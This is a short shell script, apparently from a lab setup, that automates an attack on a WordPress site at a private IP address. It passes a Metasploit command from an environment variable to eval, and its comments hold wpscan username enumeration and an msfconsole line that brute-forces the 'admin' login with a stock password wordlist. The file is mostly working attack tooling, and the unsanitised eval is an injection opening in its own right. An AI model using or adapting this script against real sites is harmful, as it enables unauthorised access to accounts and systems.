#TARGET_HOST=192.168.33.10
echo "Starting Attack on Target"
#echo "starting wpscan"
#if (wpscan -url $TARGET_HOST enumerate u | grep -q admin)
#then
#  echo "username is admin"
#  echo "Brute forcing the login with username 'admin'"
#else
# echo "Failed to find vulnerable username"
#fi
echo "Target Host - "$TARGET_HOST
PASS_FILE_LOCATION="/opt/metasploit-framework/embedded/framework/data/wordlists/adobe_top100_pass.txt"
echo "Password file location - "$PASS_FILE_LOCATION

#Check if appropriate metasploit command has been passed
if [ -z "$MS_COMMAND" ]; then
  #required env variables not found, terminating
  echo "Metasploit command is not valid"
  echo "terminating.."
else
  echo "Metasploit command "$MS_COMMAND
  echo "Starting metasploit attack"
  FIN_='msfconsole -q -x '"\""$MS_COMMAND"\""
  echo "Final command - \n"
  echo $FIN_
  eval $FIN_
  #msfconsole -q -x "use scanner/http/wordpress_login_enum;set RHOSTS $TARGET_HOST;set USERNAME admin;set PASS_FILE $PASS_FILE_LOCATION;exploit;exit;"
fi
echo "End of attack"

